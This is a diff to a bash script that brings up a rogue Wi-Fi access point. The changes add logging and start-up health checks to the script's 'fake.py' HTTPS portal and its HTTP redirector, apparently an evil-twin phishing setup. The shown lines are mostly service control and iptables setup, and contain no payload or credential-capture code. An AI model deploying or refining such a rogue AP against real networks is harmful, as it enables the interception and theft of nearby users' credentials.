@@ -6,6 +6,9 @@ GATEWAY="10.0.0.1"
 CERT_FILE="cert.crt"
 KEY_FILE="cert.key"
 
+# Create logs directory if it doesn't exist
+mkdir -p logs
+
 # ─── 1. Kill existing services ────────────────────────────────────
 echo "[*] Stopping conflicting services..."
 sudo pkill hostapd
@@ -27,6 +30,9 @@ if ! ip link show $IFACE >/dev/null 2>&1; then
     echo "Please edit IFACE variable in the script to match your wireless interface"
     exit 1
 fi
+
+# Remove existing IP if it exists
+sudo ip addr del $GATEWAY/24 dev $IFACE 2>/dev/null
 
 sudo ip link set $IFACE down
 sudo iw dev $IFACE set type __ap
@@ -87,10 +93,27 @@ sudo iptables -A FORWARD -i $IFACE -o eth0 -j DROP
 
 # ─── 7. Start Flask servers ───────────────────────────────────────
 echo "[*] Launching Flask HTTPS portal (port 443)..."
-sudo python3 fake.py > /dev/null 2>&1 &
+sudo python3 fake.py 2>&1 | tee logs/fake.log &
 
 echo "[*] Launching Flask HTTP redirector (port 80)..."
-sudo python3 http_redirect.py > /dev/null 2>&1 &
+sudo python3 http_redirect.py 2>&1 | tee logs/redirect.log &
+
+# Wait a moment for servers to start
+sleep 2
+
+# Check if servers are running
+echo "[DEBUG] Checking if Flask servers are running..."
+if pgrep -f "python3 fake.py" > /dev/null; then
+    echo "[✓] HTTPS server is running"
+else
+    echo "[!] ERROR: HTTPS server failed to start. Check logs/fake.log"
+fi
+
+if pgrep -f "python3 http_redirect.py" > /dev/null; then
+    echo "[✓] HTTP redirector is running"
+else
+    echo "[!] ERROR: HTTP redirector failed to start. Check logs/redirect.log"
+fi
 
 # ─── 8. Done ──────────────────────────────────────────────────────
 echo "[✓] Rogue AP is live at $GATEWAY"
